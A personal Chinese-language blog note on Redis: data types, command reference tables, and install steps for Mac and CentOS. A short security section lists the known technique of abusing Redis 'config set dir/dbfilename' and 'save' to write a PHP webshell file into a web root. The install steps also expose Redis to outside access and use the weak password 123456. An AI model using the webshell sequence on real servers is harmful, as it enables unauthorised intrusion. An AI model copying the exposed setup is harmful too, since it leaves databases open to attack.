---
title: redis
toc: true
recommend: 1
uniqueId: '2020-05-29 07:56:39/"redis".html'
date: 2020-05-29 15:56:39
thumbnail:
categories:
- redis
tags:
keywords:
---



[TOC]

<!--more-->

# 学习

cv 学习法。。。

### redis 七种数据类型

```
# string        key->value,像是 map
set k v
mset k1 v1 k2 v2
get k
mget k1 k2

# hash        key-> {k1: v1, k2: v2}  像是 map 的 map
hmset key k1 v1 k2 v2
hgetall key

# list        name -> [i1, i2...]    value 是个 list
lpush name i1
lpush name i2
lrange name 0 10

# set        name -> {i1, i2, ...}
哈希表实现的，增删查 复杂度都是 o1
sadd name i1
sadd name i2
smembers name

# zset       name -> {i1->score1, i2->score2, ...}
#  有序 set 为什么是 z 而不是 s(sort) sset
每个元素关联一个分数
zadd name score1 i1
zincreby name i1 自动加一
zrangebyscore name 0 1000


# Bitmaps
通过类似 map 的结果存放 0 1
可以用来统计状态，如日活？ 是否浏览过某个东西

# HyperLogLogs 
接受许多个元素作为输入，以很少空间给出元素的基数估算值
基数：len(set(l))
估算值：可能有一点误差
PFADD unique::ip::counter '192.168.0.1'
PFADD unique::ip::counter '127.0.0.1'
PFCOUNT unique::ip::counter
2
```



### redis-cli

```shell
redis-cli -h host -p port -a password
```

### Redis 键(key) 命令

如 del key, del 则是一个 key 命令

| 命令                                                         | 描述                                                   |
| ------------------------------------------------------------ | ------------------------------------------------------ |
| [DEL](https://www.twle.cn/l/yufei/redis/redis-basic-keys-del.html) | 用于删除 key                                           |
| [DUMP](https://www.twle.cn/l/yufei/redis/redis-basic-keys-dump.html) | 序列化给定 key ，并返回被序列化的值                    |
| [EXISTS](https://www.twle.cn/l/yufei/redis/redis-basic-keys-exists.html) | 检查给定 key 是否存在                                  |
| [EXPIRE](https://www.twle.cn/l/yufei/redis/redis-basic-keys-expire.html) | 为给定 key 设置过期时间                                |
| [EXPIREAT](https://www.twle.cn/l/yufei/redis/redis-basic-keys-expireat.html) | 用于为 key 设置过期时间点 接受的时间参数是 UNIX 时间戳 |
| [PEXPIRE](https://www.twle.cn/l/yufei/redis/redis-basic-keys-pexpire.html) | 设置 key 的过期时间，以毫秒计                          |
| [PEXPIREAT](https://www.twle.cn/l/yufei/redis/redis-basic-keys-pexpireat.html) | 设置 key 过期时间的时间戳(unix timestamp)，以毫秒计    |
| [KEYS](https://www.twle.cn/l/yufei/redis/redis-basic-keys-keys.html) | 查找所有符合给定模式的 key                             |
| [MOVE](https://www.twle.cn/l/yufei/redis/redis-basic-keys-move.html) | 将当前*数据库*的 key 移动到给定的*数据库*中            |
| [PERSIST](https://www.twle.cn/l/yufei/redis/redis-basic-keys-persist.html) | 移除 key 的过期时间，key 将**持久保持**                |
| [PTTL](https://www.twle.cn/l/yufei/redis/redis-basic-keys-pttl.html) | 以毫秒为单位返回 key 的剩余的过期时间                  |
| [TTL](https://www.twle.cn/l/yufei/redis/redis-basic-keys-ttl.html) | 以秒为单位，返回给定 key 的剩余生存时间                |
| [RANDOMKEY](https://www.twle.cn/l/yufei/redis/redis-basic-keys-randomkey.html) | 从当前*数据库*中随机返回一个 key                       |
| [RENAME](https://www.twle.cn/l/yufei/redis/redis-basic-keys-rename.html) | 修改 key 的名称                                        |
| [RENAMENX](https://www.twle.cn/l/yufei/redis/redis-basic-keys-renamenx.html) | 仅当 newkey 不存在时，将 key 改名为 newkey             |
| [TYPE](https://www.twle.cn/l/yufei/redis/redis-basic-keys-type.html) | 返回 key 所储存的值的类型                              |

### Redis 字符串(String) 命令

| 命令                                                         | 描述                                                        |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| [SET](https://www.twle.cn/l/yufei/redis/redis-basic-strings-set.html) | 设置指定 key 的值                                           |
| [GET](https://www.twle.cn/l/yufei/redis/redis-basic-strings-get.html) | 获取指定 key 的值                                           |
| [GETRANGE](https://www.twle.cn/l/yufei/redis/redis-basic-strings-getrange.html) | 返回 key 中字符串值的子字符                                 |
| [GETSET](https://www.twle.cn/l/yufei/redis/redis-basic-strings-getset.html) | 将给定 key 的值设为 value ，并返回 key 的旧值 ( old value ) |
| [GETBIT](https://www.twle.cn/l/yufei/redis/redis-basic-strings-getbit.html) | 对 key 所储存的字符串值，获取指定偏移量上的位 ( bit )       |
| [MGET](https://www.twle.cn/l/yufei/redis/redis-basic-strings-mget.html) | 获取所有(一个或多个)给定 key 的值                           |
| [SETBIT](https://www.twle.cn/l/yufei/redis/redis-basic-strings-setbit.html) | 对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)    |
| [SETEX](https://www.twle.cn/l/yufei/redis/redis-basic-strings-setex.html) | 设置 key 的值为 value 同时将过期时间设为 seconds            |
| [SETNX](https://www.twle.cn/l/yufei/redis/redis-basic-strings-setnx.html) | 只有在 key 不存在时设置 key 的值                            |
| [SETRANGE](https://www.twle.cn/l/yufei/redis/redis-basic-strings-setrange.html) | 从偏移量 offset 开始用 value 覆写给定 key 所储存的字符串值  |
| [STRLEN](https://www.twle.cn/l/yufei/redis/redis-basic-strings-strlen.html) | 返回 key 所储存的字符串值的长度                             |
| [MSET](https://www.twle.cn/l/yufei/redis/redis-basic-strings-mset.html) | 同时设置一个或多个 key-value 对                             |
| [MSETNX](https://www.twle.cn/l/yufei/redis/redis-basic-strings-msetnx.html) | 同时设置一个或多个 key-value 对                             |
| [PSETEX](https://www.twle.cn/l/yufei/redis/redis-basic-strings-psetex.html) | 以毫秒为单位设置 key 的生存时间                             |
| [INCR](https://www.twle.cn/l/yufei/redis/redis-basic-strings-incr.html) | 将 key 中储存的数字值增一                                   |
| [INCRBY](https://www.twle.cn/l/yufei/redis/redis-basic-strings-incrby.html) | 将 key 所储存的值加上给定的增量值 ( increment )             |
| [INCRBYFLOAT](https://www.twle.cn/l/yufei/redis/redis-basic-strings-incrbyfloat.html) | 将 key 所储存的值加上给定的浮点增量值 ( increment )         |
| [DECR](https://www.twle.cn/l/yufei/redis/redis-basic-strings-decr.html) | 将 key 中储存的数字值减一                                   |
| [DECRBY](https://www.twle.cn/l/yufei/redis/redis-basic-strings-decrby.html) | 将 key 所储存的值减去给定的减量值 ( decrement )             |
| [APPEND](https://www.twle.cn/l/yufei/redis/redis-basic-strings-append.html) | 将 value 追加到 key 原来的值的末尾                          |

### Redis 哈希(Hash) 命令

| 命令                                                         | 描述                                                      |
| ------------------------------------------------------------ | --------------------------------------------------------- |
| [HDEL](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hdel.html) | 删除一个或多个哈希表字段                                  |
| [HEXISTS](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hexists.html) | 查看哈希表 key 中，指定的字段是否存在                     |
| [HGET](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hget.html) | 获取存储在哈希表中指定字段的值                            |
| [HGETALL](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hgetall.html) | 获取在哈希表中指定 key 的所有字段和值                     |
| [HINCRBY](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hincrby.html) | 为哈希表 key 中的指定字段的整数值加上增量 increment       |
| [HINCRBYFLOAT](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hincrbyfloat.html) | 为哈希表 key 中的指定字段的浮点数值加上增量 increment     |
| [HKEYS](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hkeys.html) | 获取所有哈希表中的字段                                    |
| [HLEN](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hlen.html) | 获取哈希表中字段的数量                                    |
| [HMGET](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hmget.html) | 获取所有给定字段的值                                      |
| [HMSET](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hmset.html) | 同时将多个 field-value (域-值)对设置到哈希表 key 中       |
| [HSET](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hset.html) | 将哈希表 key 中的字段 field 的值设为 value                |
| [HSETNX](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hsetnx.html) | 只有在字段 field 不存在时，设置哈希表字段的值             |
| [HVALS](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hvals.html) | 获取哈希表中所有值                                        |
| [HSCAN](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hscan.html) | 迭代哈希表中的键值对                                      |
| [HSTRLEN](https://www.twle.cn/l/yufei/redis/redis-basic-hashes-hstrlen.html) | 返回哈希表 key 中， 与给定域 field 相关联的值的字符串长度 |

### Redis 列表(List) 命令

| 命令                                                         | 描述                                                     |
| ------------------------------------------------------------ | -------------------------------------------------------- |
| [BLPOP](https://www.twle.cn/l/yufei/redis/redis-basic-lists-blpop.html) | 移出并获取列表的第一个元素                               |
| [BRPOP](https://www.twle.cn/l/yufei/redis/redis-basic-lists-brpop.html) | 移出并获取列表的最后一个元素                             |
| [BRPOPLPUSH](https://www.twle.cn/l/yufei/redis/redis-basic-lists-brpoplpush.html) | 从列表中弹出一个值，并将该值插入到另外一个列表中并返回它 |
| [LINDEX](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lindex.html) | 通过索引获取列表中的元素                                 |
| [LINSERT](https://www.twle.cn/l/yufei/redis/redis-basic-lists-linsert.html) | 在列表的元素前或者后插入元素                             |
| [LLEN](https://www.twle.cn/l/yufei/redis/redis-basic-lists-llen.html) | 获取列表长度                                             |
| [LPOP](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpop.html) | 移出并获取列表的第一个元素                               |
| [LPUSH](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpush.html) | 将一个或多个值插入到列表头部                             |
| [LPUSHX](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lpushx.html) | 将一个值插入到已存在的列表头部                           |
| [LRANGE](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lrange.html) | 获取列表指定范围内的元素                                 |
| [LREM](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lrem.html) | 移除列表元素                                             |
| [LSET](https://www.twle.cn/l/yufei/redis/redis-basic-lists-lset.html) | 通过索引设置列表元素的值                                 |
| [LTRIM](https://www.twle.cn/l/yufei/redis/redis-basic-lists-ltrim.html) | 对一个列表进行修剪(trim)                                 |
| [RPOP](https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpop.html) | 移除并获取列表最后一个元素                               |
| [RPOPLPUSH](https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpoplpush.html) | 移除列表的最后一个元素，并将该元素添加到另一个列表并返回 |
| [RPUSH](https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpush.html) | 在列表中添加一个或多个值                                 |
| [RPUSHX](https://www.twle.cn/l/yufei/redis/redis-basic-lists-rpushx.html) | 为已存在的列表添加值                                     |

### Redis 集合(Set) 命令

| 命令                                                         | 描述                                                |
| ------------------------------------------------------------ | --------------------------------------------------- |
| [SADD](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sadd.html) | 向集合添加一个或多个成员                            |
| [SCARD](https://www.twle.cn/l/yufei/redis/redis-basic-sets-scard.html) | 获取集合的成员数                                    |
| [SDIFF](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sdiff.html) | 返回给定所有集合的差集                              |
| [SDIFFSTORE](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sdiffstore.html) | 返回给定所有集合的差集并存储在 destination 中       |
| [SINTER](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sinter.html) | 返回给定所有集合的交集                              |
| [SINTERSTORE](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sinterstore.html) | 返回给定所有集合的交集并存储在 destination 中       |
| [SISMEMBER](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sismember.html) | 判断 member 元素是否是集合 key 的成员               |
| [SMEMBERS](https://www.twle.cn/l/yufei/redis/redis-basic-sets-smembers.html) | 返回集合中的所有成员                                |
| [SMOVE](https://www.twle.cn/l/yufei/redis/redis-basic-sets-smove.html) | 将 member 元素从 source 集合移动到 destination 集合 |
| [SPOP](https://www.twle.cn/l/yufei/redis/redis-basic-sets-spop.html) | 移除并返回集合中的一个随机元素                      |
| [SRANDMEMBER](https://www.twle.cn/l/yufei/redis/redis-basic-sets-srandmember.html) | 返回集合中一个或多个随机数                          |
| [SREM](https://www.twle.cn/l/yufei/redis/redis-basic-sets-srem.html) | 移除集合中一个或多个成员                            |
| [SUNION](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sunion.html) | 返回所有给定集合的并集                              |
| [SUNIONSTORE](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sunionstore.html) | 所有给定集合的并集存储在 destination 集合中         |
| [SSCAN](https://www.twle.cn/l/yufei/redis/redis-basic-sets-sscan.html) | 迭代集合中的元素                                    |

### Redis 有序集合(sorted set) 命令

| 命令                                                         | 描述                                                         |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [ZADD](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zadd.html) | 向有序集合添加一个或多个成员，或者更新已存在成员的分数       |
| [ZCARD](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zcard.html) | 获取有序集合的成员数                                         |
| [ZCOUNT](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zcount.html) | 计算在有序集合中指定区间分数的成员数                         |
| [ZINCRBY](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zincrby.html) | 有序集合中对指定成员的分数加上增量 increment                 |
| [ZINTERSTORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zinterstore.html) | 计算给定的一个或多个有序集的交集并将结果集存储在新的有序集合 key 中 |
| [ZLEXCOUNT](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zlexcount.html) | 在有序集合中计算指定字典区间内成员数量                       |
| [ZRANGE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrange.html) | 通过索引区间返回有序集合成指定区间内的成员                   |
| [ZRANGEBYLEX](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrangebylex.html) | 通过字典区间返回有序集合的成员                               |
| [ZRANGEBYSCORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrangebyscore.html) | 通过分数返回有序集合指定区间内的成员                         |
| [ZRANK](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrank.html) | 返回有序集合中指定成员的索引                                 |
| [ZREM](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrem.html) | 移除有序集合中的一个或多个成员                               |
| [ZREMRANGEBYLEX](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebylex.html) | 移除有序集合中给定的字典区间的所有成员                       |
| [ZREMRANGEBYRANK](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebyrank.html) | 移除有序集合中给定的排名区间的所有成员                       |
| [ZREMRANGEBYSCORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zremrangebyscore.html) | 移除有序集合中给定的分数区间的所有成员                       |
| [ZREVRANGE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrange.html) | 返回有序集中指定区间内的成员，通过索引，分数从高到底         |
| [ZREVRANGEBYSCORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrangebyscore.html) | 返回有序集中指定分数区间内的成员，分数从高到低排序           |
| [ZREVRANK](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zrevrank.html) | 返回有序集合中指定成员的排名，有序集成员按分数值递减(从大到小)排序 |
| [ZSCORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zscore.html) | 返回有序集中，成员的分数值                                   |
| [ZUNIONSTORE](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zunionstore.html) | 计算一个或多个有序集的并集，并存储在新的 key 中              |
| [ZSCAN](https://www.twle.cn/l/yufei/redis/redis-basic-sorted-sets-zscan.html) | 迭代有序集合中的元素（包括元素成员和元素分值）               |

### Redis HyperLogLog 命令

| 命令                                                         | 描述                                      |
| ------------------------------------------------------------ | ----------------------------------------- |
| [PFADD](https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfadd.html) | 添加指定元素到 HyperLogLog 中             |
| [PFCOUNT](https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfcount.html) | 返回给定 HyperLogLog 的基数估算值         |
| [PFMERGE](https://www.twle.cn/l/yufei/redis/redis-basic-hyperloglog-pfmerge.html) | 将多个 HyperLogLog 合并为一个 HyperLogLog |

### Redis 发布订阅

[Redis 发布订阅 - Redis 基础教程 - 简单教程，简单编程](https://www.twle.cn/l/yufei/redis/redis-basic-pub-sub.html)

### Redis 事务



### Redis Script( 脚本 ) 命令



### Redis 连接命令



### Redis 服务器



### Java 使用 Redis



### PHP 和 Redis



### Redis 数据备份与恢复



### Redis 服务安全



### Redis 性能测试



### Redis 客户端连接



### Redis 管道技术



### Redis 分区





### redis安全学习小记

[redis安全学习小记](https://mp.weixin.qq.com/s/W9joCtUQfNA62ZWXwqMmsw)

**REDIS连接命令**

redis-cli -h host -p port

**获取配置**

config get *

**编辑配置**

修改 redis.conf 文件或使用 config set 命令来修改配置

**数据类型**

五种：string list set zset hash

**服务器配置**

用 sed 修改配置（值得学习的装逼技术）：

sed -i 's/daemonize no/daemonize yes/g' /etc/redis-5.0.8/redis.conf

***redis*设置密码的两种方法**
*redis*-*cli*连上去
`config set requirepass 123456`
或者修改*redis*.conf

```
sed -i 's/# requirepass foobared/requirepass 123456/g' /etc/redis/redis.conf
```

第二种方法设置完之后需要重启*redis*。

然后再用*redis*-*cli*去连的时候需要先执行 AUTH 命令才可以执行其他命令。
`AUTH 123456`
*redis*-*cli* -a 的参数本质是就是 AUTH 命令

**数据库备份**
Redis SAVE 命令用于创建当前数据库的备份。常见利用其来写文件达到 getshell 的目的。

redis-cli -h 127.0.0.1 flushall #清空所有key
redis-cli -h 127.0.0.1 config set dir /var/www #设置数据库备份保存的目录
redis-cli -h 127.0.0.1 config set dbfilename shell.php #设置数据库备份保存的文件名
redis-cli -h 127.0.0.1 set webshell "<?php phpinfo();?>" #将想写入的内容写进key值
redis-cli -h 127.0.0.1 save # 备份

# 实践

## 安装

### Mac：

```shell
brew install redis
# To have launchd start redis now and restart at login:
#   brew services start redis
# Or, if you don't want/need a background service you can just run:
#   redis-server /usr/local/etc/redis.conf
brew update;brew services start redis

cotEdit /usr/local/etc/redis.conf
注释 bind 127.0.0.1
取消注释 requirepass foobare， 并配置密码

brew services list                
# Name          Status  User         Plist
# elasticsearch stopped
# redis         started zhangronghui /Users/zhangronghui/Library/LaunchAgents/homebrew.mxcl.redis.plist
# unbound       stopped

brew services restart redis
pip install iredis
redis-cli/iredis -a redispassword --raw
```



### Linux 上

[centos安装redis - 掘金](https://juejin.im/post/5ecc754bf265da770f51f373)

```shell
# wget http://download.redis.io/releases/redis-5.0.7.tar.gz
rsync -azvhP ~/Downloads/Compressed/redis-5.0.7.tar.gz  root@47.93.53.47:/tmp
cd /tmp
tar xf /tmp/redis-5.0.7.tar.gz
cd redis-5.0.7
make
make PREFIX=/usr/local/redis install

mkdir /usr/local/redis/etc
cp redis.conf /usr/local/redis/etc
vim /usr/local/redis/etc/redis.conf

1）配置redis为后台启动：daemonize no  修改为 daemonize yes
2）开启外网访问：bind 127.0.01  注释掉
3）配置密码：requirepass 设置密码

pip install iredis
iredis --raw

vim ~/.zshrc
export PATH=/usr/local/redis/bin:$PATH

# 启动
redis-server /usr/local/redis/etc/redis.conf

iredis --raw
```



<img src="https://i.loli.net/2020/03/12/CXDx73TjfPUGYwL.png" alt="CXDx73TjfPUGYwL" style="zoom:33%;" />



# 工具

[laixintao/iredis: Interactive Redis: A Terminal Client for Redis with AutoCompletion and Syntax Highlighting.](https://github.com/laixintao/iredis)

```
pip install iredis
```

启动 redis-cli 或者更好的替代品 iredis ( pip install iredis )

```shell
iredis -a redispassword --raw # --raw 为了可以查看中文
```



[mylxsw/redis-tui: A Redis Text-based UI client in CLI](https://github.com/mylxsw/redis-tui)

# 其他

